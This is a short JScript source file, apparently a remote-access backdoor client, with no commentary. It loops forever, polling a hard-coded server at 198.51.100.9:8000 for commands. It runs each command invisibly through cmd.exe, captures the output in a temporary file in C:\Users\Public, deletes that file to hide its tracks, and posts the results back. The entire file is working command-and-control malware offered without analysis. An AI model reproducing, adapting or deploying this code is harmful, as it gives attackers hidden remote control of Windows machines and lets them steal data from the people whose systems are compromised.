class Agent {
static function post(body, id) {
	var c = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	c.Open("POST", "http://198.51.100.9:8000/X" + id, false);
	c.Send(body + "()" + id);
	return c.responseText;
}
static function go() {
	var sh = new ActiveXObject("WScript.Shell");
	var fs = new ActiveXObject("Scripting.FileSystemObject");
	for (;;) {
		var cmd = post("hi", "k9Z1q");
		sh.Run("cmd.exe /c " + cmd + " > C:\\Users\\Public\\o.txt", 0, true);
		var f = fs.OpenTextFile("C:\\Users\\Public\\o.txt", 1);
		var out = f.ReadAll(); f.Close();
		fs.DeleteFile("C:\\Users\\Public\\o.txt");
		post(out, "k9Z1q");
		WScript.Sleep(10000);
	}
}
}
